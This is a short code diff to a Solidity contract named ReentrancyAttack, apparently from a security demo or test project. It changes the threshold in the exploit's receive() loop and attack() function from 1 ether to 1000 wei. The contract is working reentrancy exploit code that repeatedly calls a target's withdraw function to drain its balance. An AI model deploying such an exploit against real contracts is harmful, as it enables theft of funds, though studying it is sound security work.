@@ -32,13 +32,13 @@ contract ReentrancyAttack {
     }
 
     receive() external payable {
-        if (address(reentrancyVuln).balance >= 1 ether) {
+        if (address(reentrancyVuln).balance >= 1000) {
             reentrancyVuln.withdraw();
         }
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether, "No provided ether");
+        require(msg.value >= 1000, "No provided ether");
         reentrancyVuln.deposit{value: msg.value}();
         reentrancyVuln.withdraw();
     }
